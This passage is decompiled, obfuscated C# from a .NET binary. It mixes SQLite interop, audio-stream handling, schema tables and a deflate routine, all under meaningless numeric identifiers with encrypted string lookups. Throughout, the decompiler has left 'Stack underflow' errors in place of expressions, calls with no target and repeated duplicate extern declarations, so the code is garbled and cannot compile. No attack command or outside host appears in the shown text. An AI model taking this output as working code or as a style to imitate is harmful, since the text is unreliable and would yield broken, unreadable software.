			{
				_0080._0014._0001(107350741);
				throw new ArgumentNullException((string?)/*Error near IL_0020: Stack underflow*/);
			}
			if (global::_001C._0096_0003(_0003))
			{
				throw new ArgumentNullException(_0080._0014._0001(107388827));
			}
			if (global::_001A._007E_0016_0003(_0002) != 4)
			{
				throw new ArgumentOutOfRangeException(_0080._0014._0001(107350741), global::_0011._008E_0002(_0080._0014._0001(107350736), _0002, _0080._0014._0001(107350695)));
			}
			byte[] array = new byte[2] { 255, 254 };
			byte[] array2 = new byte[3];
			byte[] array3 = new byte[2];
			byte[] array4 = ((!_0010_0003._008B_0006(_0002, _0080._0014._0001(107361669))) ? _0018._0001(new byte[3][]
			{
				new byte[1] { 1 },
				array,
				_0087_0003._007E_0081_0007(_0082_0002._0089_0005(), _0003)
			}) : _0018._0001(new byte[5][]
			{
				new byte[1] { 1 },
				array2,
				array3,
				array,
				_0087_0003._007E_0081_0007(_0082_0002._0089_0005(), _0003)
			}));
			return _0018._0001(new byte[4][]
			{
				_0087_0003._007E_0081_0007(_0082_0002._0088_0005(), _0002),
				_0018._0001(array4.Length),
				new byte[2],
				array4
			});
		}

		static string _0001(_0014 _0002, int P_1)
		{
			//IL_000c: Invalid comparison between Unknown and I4
			//IL_0043: Incompatible stack heights: 0 vs 1
			//IL_004d: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_004a: Stack underflow*/);
			int num = _0002._0004;
			if ((int)/*Error near IL_000e: Stack underflow*/ >= num && _0002._0001 != null)
			{
				return _0018._0001(_0002._0001, P_1 - _0002._0004);
			}
			return _0002._0001._0001._0002(_0002._0001, P_1);
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_column_int64")]
		static extern long _0001(IntPtr _0002, int _0003);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("Msacm32.dll", EntryPoint = "acmStreamSize")]
		static extern MmResult _0001(IntPtr _0002, int _0003, out int _0004, _0080._0008 _0005);

		static global::_0006._0006 _0001(global::_0006._0006 _0002)
		{
			//IL_0063: Incompatible stack heights: 0 vs 1
			//IL_006a: Incompatible stack heights: 0 vs 1
			//IL_006d: Incompatible stack heights: 0 vs 1
			_ = ((global::_0006._0006)/*Error near IL_006a: Stack underflow*/).WaveFormat;
			if (((global::_0005._0005)/*Error near IL_0009: Stack underflow*/)._0001 == WaveFormatEncoding.Pcm)
			{
				return (global::_0006._0006)/*Error near IL_000f: Stack underflow*/;
			}
			global::_0005._0005 obj = _0018._0001(_0002.WaveFormat);
			if (obj._0001 < 8000)
			{
				if (_0002.WaveFormat._0001 != WaveFormatEncoding.G723)
				{
					throw new InvalidOperationException(_0080._0014._0001(107350658));
				}
				obj = new global::_0005._0005(8000, 16, 1);
			}
			return new global::_000F._0005(obj, _0002);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(Exception _0002, _001D._0004 P_1)
		{
			//IL_006c: Incompatible stack heights: 0 vs 1
			//IL_0072: Incompatible stack heights: 0 vs 1
			new _001D._0004._0001();
			_001D._0004._0001 CS_0024_003C_003E8__locals0;
			if (2u != 0)
			{
				CS_0024_003C_003E8__locals0 = (_001D._0004._0001)/*Error near IL_006f: Stack underflow*/;
			}
			((_001D._0004._0001)/*Error near IL_000e: Stack underflow*/)._0001 = P_1;
			CS_0024_003C_003E8__locals0._0001 = _0002;
			CS_0024_003C_003E8__locals0._0001 = P_1._0001;
			if (CS_0024_003C_003E8__locals0._0001 == null)
			{
				return;
			}
			if (P_1._0001 == null)
			{
				CS_0024_003C_003E8__locals0._0001(P_1, new global::_0003._0003(CS_0024_003C_003E8__locals0._0001));
				return;
			}
			_0011_0005._007E_0097_000E(P_1._0001, delegate
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = ((_001D._0004._0001)/*Error near IL_0007: Stack underflow*/)._0001;
				_ = ((_001D._0004._0001)/*Error near IL_000e: Stack underflow*/)._0001;
				global::_0003._0003 e = new global::_0003._0003(((_001D._0004._0001)/*Error near IL_0015: Stack underflow*/)._0001);
				/*Error near IL_001f: Stack underflow*/((object?)/*Error near IL_001f: Stack underflow*/, e);
			}, null);
		}

		static void _0001(global::_0007._0007 P_0)
		{
			//IL_0066: Incompatible stack heights: 0 vs 1
			//IL_006c: Incompatible stack heights: 0 vs 2
			object obj = ((global::_0007._0007)/*Error near IL_0007: Stack underflow*/)._0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
			MmResult mmResult;
			try
			{
				mmResult = _0018._0001(P_0._0001, P_0._0001, _0098._0089_0004(P_0._0001));
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
			if (mmResult != 0)
			{
				throw new global::_0013._0001(mmResult, _0080._0014._0001(107350589));
			}
			_0091_0002._009E_0005(P_0);
		}

		static long _0001(global::_000E._0008 P_0)
		{
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			if (((global::_000E._0008)/*Error near IL_0007: Stack underflow*/)._0001 != 0)
			{
				global::_000E._0008._000F obj = ((global::_000E._0008)/*Error near IL_0010: Stack underflow*/)._0002;
				if (obj != null)
				{
					obj._0001(out var num, out var _);
					return num + P_0._0001;
				}
			}
			return 0L;
		}

		static void _0001(global::_0010._0019 P_0)
		{
			//IL_0021: Incompatible stack heights: 0 vs 2
			//IL_0028: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			((global::_0010._0019)/*Error near IL_000c: Stack underflow*/)._0001._0001(_001C._0014._0001, out var obj);
			/*Error near IL_002f: Stack underflow*/((int)/*Error near IL_002f: Stack underflow*/);
			P_0._0001 = new global::_0015._0013(obj);
		}

		static string _0001(IntPtr _0002, int _0003)
		{
			//IL_003a: Incompatible stack heights: 0 vs 1
			//IL_003d: Incompatible stack heights: 0 vs 2
			//IL_0044: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				_ = _0090_0002._009A_0005;
				IntPtr zero = IntPtr.Zero;
				/*Error near IL_0044: Stack underflow*/((IntPtr)/*Error near IL_0044: Stack underflow*/, zero);
				if ((int)/*Error near IL_0014: Stack underflow*/ == 0)
				{
					if (_0003 == -1)
					{
						return _0090_0003._008D_0007(_0002);
					}
					return _001B_0006._0010_0010(_0002, _0003 / 2);
				}
			}
			return string.Empty;
		}

		static DataTable _0001(global::_0017._0080 P_0)
		{
			//IL_047e: Incompatible stack heights: 0 vs 1
			//IL_0488: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107350540);
			new DataTable((string?)/*Error near IL_0488: Stack underflow*/);
			DataTable dataTable = (DataTable)/*Error near IL_048e: Stack underflow*/;
			_0001_0005._007E_008A_000E(dataTable, _008F_0003._008B_0007());
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350559), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350546), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107351037), _0091._0080_0004(typeof(long).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350988), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107351003), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350946), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350965), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350936), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350887), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350898), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350877), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350816), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350839), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350790), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350805), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350264), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350239), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350186), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350197), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350148), _0091._0080_0004(typeof(short).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350163), _0091._0080_0004(typeof(short).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350114), _0091._0080_0004(typeof(bool).TypeHandle));
			global::_0008._007E_0011_0002(dataTable);
			StringReader stringReader = new StringReader(global::_0005._0019.DataTypes);
			_001C_0006._007E_0011_0010(dataTable, stringReader);
			global::_0008._007E_001E_0002(stringReader);
			global::_0008._007E_0013_0002(dataTable);
			global::_0008._007E_0012_0002(dataTable);
			return dataTable;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0004._000E _0001(int _0002, Stream _0003, int _0004)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 2
			_ = global::_0012._007E_0091_0002;
			return new global::_0004._000E(_001D_0090_0006: /*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/), _001C_0090_0006: (int)/*Error near IL_0015: Stack underflow*/, _0089_0010: (int)/*Error near IL_0015: Stack underflow*/);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(object _0002, global::_0001._0006 _0003)
		{
			//IL_0022: Incompatible stack heights: 0 vs 2
			//IL_0025: Incompatible stack heights: 0 vs 1
			_ = _001D_0006._0012_0010;
			_0080._0014._0001(107350089);
			object obj = ((global::_0001._0006)/*Error near IL_0014: Stack underflow*/)._0001;
			/*Error near IL_002c: Stack underflow*/((string)/*Error near IL_002c: Stack underflow*/, obj);
		}

		static void _0001(global::_0017._007F._0007._0001 _0002, global::_0017._007F._0007._0001 P_1)
		{
			int num = -1;
			int num2 = 0;
			while (num2 < _0002._0002)
			{
				int num3 = 1;
				int num4 = _0002._0001[num2];
				int num5;
				int num6;
				if (num4 == 0)
				{
					num5 = 138;
					num6 = 3;
				}
				else
				{
					num5 = 6;
					num6 = 3;
					if (num != num4)
					{
						P_1._0001[num4]++;
						num3 = 0;
					}
				}
				num = num4;
				num2++;
				while (num2 < _0002._0002 && num == _0002._0001[num2])
				{
					num2++;
					if (++num3 >= num5)
					{
						break;
					}
				}
				if (num3 < num6)
				{
					P_1._0001[num] += (short)num3;
				}
				else if (num != 0)
				{
					P_1._0001[16]++;
				}
				else if (num3 <= 10)
				{
					P_1._0001[17]++;
				}
				else
				{
					P_1._0001[18]++;
				}
			}
		}

		static bool _0001(bool _0002, IntPtr _0003, global::_000E._001F _0004)
		{
			//IL_0130: Incompatible stack heights: 0 vs 1
			//IL_0136: Incompatible stack heights: 0 vs 2
			//IL_0140: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0007: Stack underflow*/ != 0)
			{
				_ = _0090_0002._009A_0005;
				IntPtr zero = IntPtr.Zero;
				/*Error near IL_0140: Stack underflow*/((IntPtr)/*Error near IL_0140: Stack underflow*/, zero);
				if ((int)/*Error near IL_001d: Stack underflow*/ == 0)
				{
					bool result = false;
					try
					{
					}
					finally
					{
						global::_000E._001F obj;
						_0091_0002._009C_0005(obj = _0004);
						try
						{
							if (_0002 && global::_001B._007E_008A_0003(_0004))
							{
								throw new InvalidOperationException(_0080._0014._0001(107402080));
							}
							if (_0002 && global::_001B._007E_008B_0003(_0004))
							{
								throw new InvalidOperationException(_0080._0014._0001(107402067));
							}
							if (!global::_001B._007E_008A_0003(_0004) && !global::_001B._007E_008B_0003(_0004))
							{
								IntPtr intPtr = IntPtr.Zero;
								do
								{
									intPtr = _0018._0001(_0003, intPtr);
									if (_0090_0002._0099_0005(intPtr, IntPtr.Zero))
									{
										_0080._0017 obj2 = _0018._0001(intPtr);
									}
								}
								while (_0090_0002._0099_0005(intPtr, IntPtr.Zero));
								if (_0018._0001(_0004, _0003))
								{
									result = true;
								}
								else
								{
									_0080._0017 obj2 = _0018._0001(_0003, _0018._0001(_0080._0014._0001(107350060)), IntPtr.Zero, IntPtr.Zero, ref intPtr);
									if (obj2 == _0080._0017._0002)
									{
										result = true;
									}
									else if (_0002)
									{
										throw new SQLiteException(obj2, _0018._0001(_0004, _0003));
									}
								}
							}
						}
						finally
						{
							_0091_0002._009D_0005(obj);
						}
					}
					_0091_0002._009E_0005(_0004);
					return result;
				}
			}
			return false;
		}

		[DllImport("winmm.dll", EntryPoint = "waveOutReset")]
		static extern MmResult _0001(IntPtr _0002);

		[DllImport("mfplat.dll", EntryPoint = "MFCreateMFByteStreamOnStreamEx", ExactSpelling = true, PreserveSig = false)]
		static extern void _0001([MarshalAs(UnmanagedType.IUnknown)] object _0002, out _0010 _0003);

		static void _0001(global::_0001._007F _0002, string P_1)
		{
			//IL_004e: Incompatible stack heights: 0 vs 2
			//IL_0055: Incompatible stack heights: 0 vs 1
			//IL_005c: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((global::_0001._007F)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0055: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				new InvalidOperationException();
				throw /*Error near IL_0018: Stack underflow*/;
			}
			byte[] array = _0018._0001(P_1);
			if (array == null)
			{
				throw new ArgumentNullException(_0080._0014._0001(107388827));
			}
			_0018._0001(_0002._0001, array, array.Length, _0099._008E_0004(-1));
		}

		static void _0001(_001D._0010 P_0)
		{
			//IL_0081: Incompatible stack heights: 0 vs 1
			//IL_0087: Incompatible stack heights: 0 vs 2
			//IL_008d: Incompatible stack heights: 0 vs 1
			_ = ((_001D._0010)/*Error near IL_0007: Stack underflow*/)._0001;
			IntPtr intPtr = (nint)((_001D._0010)/*Error near IL_0011: Stack underflow*/)._0001.LongLength;
			((global::_0013._000E)/*Error near IL_0018: Stack underflow*/)._0002 = (int)(nint)intPtr;
			((_001D._0010)/*Error near IL_001f: Stack underflow*/)._0001._0002 = P_0._0001.AddrOfPinnedObject();
			P_0._0001._0004 = P_0._0002.Length;
			P_0._0001._0004 = P_0._0002.AddrOfPinnedObject();
			MmResult mmResult = _0018._0001(P_0._0001, P_0._0001, 0);
			if (mmResult != 0)
			{
				throw new global::_0013._0001(mmResult, _0080._0014._0001(107350079));
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("ole32.dll", EntryPoint = "PropVariantClear")]
		static extern int _0001(IntPtr _0002);

		static void _0001(global::_0017._0015 _0002, AsioError _0003, string P_2)
		{
			//IL_000b: Invalid comparison between Unknown and I4
			//IL_003a: Incompatible stack heights: 0 vs 1
			//IL_003d: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && (int)/*Error near IL_000d: Stack underflow*/ != 1061701536)
			{
				_ = _0089_0002._0092_0005;
				_0080._0014._0001(107350046);
				string text = _0018._0001(_0003);
				string text2 = _0018._0001(_0002);
				throw new global::_0016._0013(/*Error near IL_002b: Stack underflow*/((string)/*Error near IL_002b: Stack underflow*/, text, P_2, text2))
				{
					Error = _0003
				};
			}
		}

		static string _0001(string _0002, DateTimeKind _0003)
		{
			//IL_000a: Invalid comparison between Unknown and I4
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				return (string)/*Error near IL_0007: Stack underflow*/;
			}
			if ((int)/*Error near IL_000c: Stack underflow*/ != 1)
			{
				return global::_0001._001A._0004;
			}
			return global::_0001._001A._0003;
		}

		static IntPtr _0001(string _0002)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_0012: Incompatible stack heights: 0 vs 1
			_0018._0001((string)/*Error near IL_0012: Stack underflow*/, 258);
			return (IntPtr)/*Error near IL_000a: Stack underflow*/;
		}

		static void _0001()
		{
			//IL_00e9: Incompatible stack heights: 0 vs 1
			//IL_00f3: Incompatible stack heights: 0 vs 2
			//IL_00fd: Incompatible stack heights: 0 vs 1
			_0018._0001();
			if ((int)/*Error near IL_0007: Stack underflow*/ != 0)
			{
				return;
			}
			_ = global::_001B._007E_0091_0003;
			_0097_0004._001F_000E();
			/*Error near IL_00fd: Stack underflow*/((object)/*Error near IL_00fd: Stack underflow*/);
			if ((int)/*Error near IL_001e: Stack underflow*/ == 0 && _0018._0001(_0080._0014._0001(107350485), (string)null) == null)
			{
				return;
			}
			object obj;
			_0091_0002._009C_0005(obj = global::_0015._0016._0001);
			try
			{
				if (global::_0015._0016._0001 == null)
				{
					global::_0015._0016._0001 = _0018._0001;
					_0097_0005._007E_0088_000F(_0097_0004._001F_000E(), global::_0015._0016._0001);
				}
				if (global::_0015._0016._0001 == null)
				{
					global::_0015._0016._0001 = new global::_0002._0019(SQLiteDateFormats.ISO8601, DateTimeKind.Unspecified, null, IntPtr.Zero, null, _000F_0017_0006: false);
				}
				if (global::_0015._0016._0001 == null)
				{
					global::_0015._0016._0001 = _0018._0001;
					_0080._0017 obj2 = global::_0015._0016._0001._0001(global::_0015._0016._0001);
					if (obj2 != 0)
					{
						throw new SQLiteException(obj2, _0080._0014._0001(107350432));
					}
				}
				global::_0015._0016._0001 = true;
				_0018._0001();
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		static void _0001(_001B._0008 _0002, object P_1)
		{
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 1
			if (((_001B._0008)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				((_001B._0008)/*Error near IL_0010: Stack underflow*/)._0001._0004();
			}
			_0098._008A_0004(P_1);
		}

		static void _0001(global::_0017._001B P_0)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 2
			_0018._0001((global::_0017._001B)/*Error near IL_0019: Stack underflow*/);
			_ = _0091_0002._009B_0005;
			/*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/);
		}

		static bool _0001(global::_0017._0015 _0002, IntPtr P_1)
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 2
			//IL_0025: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._0015)/*Error near IL_0007: Stack underflow*/)._0001._0001;
			_ = ((global::_0017._0015)/*Error near IL_0013: Stack underflow*/)._0001;
			return /*Error near IL_001a: Stack underflow*/((IntPtr)/*Error near IL_001a: Stack underflow*/, (IntPtr)/*Error near IL_001a: Stack underflow*/) == 1;
		}

		static DataTable _0001(global::_0017._0080 _0002, string _0003, string _0004, string P_3)
		{
			//IL_0ba0: Incompatible stack heights: 0 vs 1
			//IL_0baa: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107358997);
			new DataTable((string?)/*Error near IL_0baa: Stack underflow*/);
			DataTable dataTable = (DataTable)/*Error near IL_0bb0: Stack underflow*/;
			List<int> list = new List<int>();
			_0001_0005._007E_008A_000E(dataTable, _008F_0003._008B_0007());
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362308), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362799), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362814), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350423), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350370), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362723), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107358899), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107358816), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350385), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350340), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350363), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350314), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350329), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350320), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107350299), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107349738), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362780), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362765), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359336), _0091._0080_0004(typeof(Guid).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107359351), _0091._0080_0004(typeof(long).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107349749), _0091._0080_0004(typeof(short).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107349704), _0091._0080_0004(typeof(decimal).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107349719), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107349678), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107349685), _0091._0080_0004(typeof(bool).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107349636), _0091._0080_0004(typeof(string).TypeHandle));
			global::_0008._007E_0011_0002(dataTable);
			if (global::_001C._0096_0003(_0003))
			{
				_0003 = _0080._0014._0001(107401775);
			}
			string text = ((_009D_0003._009D_0007(_0003, _0080._0014._0001(107401766), StringComparison.OrdinalIgnoreCase) == 0) ? _0080._0014._0001(107362630) : _0080._0014._0001(107362683));
			global::_0010._001C obj = new global::_0010._001C(_0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107362605), new object[2] { _0003, text }), _0002);
			try
			{
				_0014 obj2 = _0018._0001(obj);
				try
				{
					while (global::_001B._007E_008F_0003(obj2))
					{
						bool flag = false;
						list.Clear();
						if (!global::_001C._0096_0003(_0004) && _009D_0003._009D_0007(_009E_0003._007E_0001_0008(obj2, 2), _0004, StringComparison.OrdinalIgnoreCase) != 0)
						{
							continue;
						}
						try
						{
							global::_0010._001C obj3 = new global::_0010._001C(_0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107362024), new object[2]
							{
								_0003,
								_009E_0003._007E_0001_0008(obj2, 2)
							}), _0002);
							try
							{
								_0014 obj4 = _0018._0001(obj3);
								try
								{
									while (global::_001B._007E_008F_0003(obj4))
									{
										if (_0004_0005._007E_008D_000E(obj4, 5) != 0)
										{
											list.Add(_0004_0005._007E_008D_000E(obj4, 0));
											if (_009D_0003._009D_0007(_009E_0003._007E_0001_0008(obj4, 2), _0080._0014._0001(107362015), StringComparison.OrdinalIgnoreCase) == 0)
											{
												flag = true;
											}
										}
									}
								}
								finally
								{
									if (obj4 != null)
									{
										global::_0008._007E_0098(obj4);
									}
								}
							}
							finally
							{
								if (obj3 != null)
								{
									global::_0008._007E_0098(obj3);
								}
							}
						}
						catch (SQLiteException)
						{
						}
						if (list.Count == 1 && flag)
						{
							DataRow dataRow = _0005_0005._007E_008E_000E(dataTable);
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362308), _0003);
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362814), _009E_0003._007E_0001_0008(obj2, 2));
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107350423), _0003);
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107358899), true);
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362723), _0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107362002), new object[2]
							{
								_009E_0003._007E_0001_0008(obj2, 2),
								text
							}));
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107358816), true);
							if (_009D_0003._009D_0007((string)_0006_0004._007E_0010_0008(dataRow, _0080._0014._0001(107362723)), P_3, StringComparison.OrdinalIgnoreCase) == 0 || P_3 == null)
							{
								_0007_0005._007E_0090_000E(_0006_0005._007E_008F_000E(dataTable), dataRow);
							}
							list.Clear();
						}
						try
						{
							global::_0010._001C obj5 = new global::_0010._001C(_0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107349611), new object[2]
							{
								_0003,
								_009E_0003._007E_0001_0008(obj2, 2)
							}), _0002);
							try
							{
								_0014 obj6 = _0018._0001(obj5);
								try
								{
									while (global::_001B._007E_008F_0003(obj6))
									{
